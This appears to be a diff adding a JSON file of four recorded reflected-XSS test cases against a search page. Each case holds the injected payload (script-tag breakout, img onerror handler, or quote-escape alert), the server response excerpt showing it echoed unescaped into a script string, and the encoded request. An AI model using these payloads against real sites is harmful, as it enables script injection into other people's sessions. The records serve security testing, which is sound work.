@@ -1,0 +1,62 @@
+[
+  {
+    "case": "lan-300",
+    "observation_id": "obs_becbc7031e3345af9d87ed3bd8bd65b6",
+    "response_sha256": "68d5fa1ab5108d71e6a9699a327e9ff2d710398e760564e12a62af5950c182f5",
+    "submitted": "xsspocd17</script><script>document.title='xsspoc-d17'</script>",
+    "response_headers": {
+      "content-type": "text/html; charset=utf-8"
+    },
+    "script_excerpt": "<script>\n                        var searchTerms = 'xsspocd17</script><script>document.title=\\'xsspoc-d17\\'</script>';\n                        document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">');\n                    </script>",
+    "excerpt_range_bytes": [
+      3098,
+      3379
+    ],
+    "encoded_request_query": "search=xsspocd17%3C%2Fscript%3E%3Cscript%3Edocument.title%3D%27xsspoc-d17%27%3C%2Fscript%3E"
+  },
+  {
+    "case": "lan-700",
+    "observation_id": "obs_6f313baaf7244c469d79a25164f1806e",
+    "response_sha256": "1e22e587b32c6c6fbab3e8044412cdce96cf5105600f09703b9c5793f9dc3318",
+    "submitted": "xsspoc1770031201</script><img src=x onerror=\"document.title='xsspoc-1770031201'\">",
+    "response_headers": {
+      "content-type": "text/html; charset=utf-8"
+    },
+    "script_excerpt": "<script>\n                        var searchTerms = 'xsspoc1770031201</script><img src=x onerror=\"document.title=\\'xsspoc-1770031201\\'\">';\n                        document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">');\n                    </script>",
+    "excerpt_range_bytes": [
+      3121,
+      3421
+    ],
+    "encoded_request_query": "search=xsspoc1770031201%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3D%22document.title%3D%27xsspoc-1770031201%27%22%3E"
+  },
+  {
+    "case": "lan-1000",
+    "observation_id": "obs_57769ebc9ae841acb108d2cb496ddaea",
+    "response_sha256": "2e06b44d0b5306462037a04d1dc016b85fbd2696e0acdca7bd6db432b008200e",
+    "submitted": "\\';alert(1)//",
+    "response_headers": {
+      "content-type": "text/html; charset=utf-8"
+    },
+    "script_excerpt": "<script>\n                        var searchTerms = '\\\\\\';alert(1)//';\n                        document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">');\n                    </script>",
+    "excerpt_range_bytes": [
+      3027,
+      3259
+    ],
+    "encoded_request_query": "search=\\%27%3Balert(1)%2F%2F"
+  },
+  {
+    "case": "lan-2000",
+    "observation_id": "obs_975a5249f5a649e399dd45b7d36c9481",
+    "response_sha256": "e5b46157277df23c83b46c3566499df218d8224eb074aa0aa2217d5c520f86a2",
+    "submitted": "</script><script>document.title='842917'</script>",
+    "response_headers": {
+      "content-type": "text/html; charset=utf-8"
+    },
+    "script_excerpt": "<script>\n                        var searchTerms = '</script><script>document.title=\\'842917\\'</script>';\n                        document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">');\n                    </script>",
+    "excerpt_range_bytes": [
+      3085,
+      3353
+    ],
+    "encoded_request_query": "search=%3C%2Fscript%3E%3Cscript%3Edocument.title%3D%27842917%27%3C%2Fscript%3E"
+  }
+]
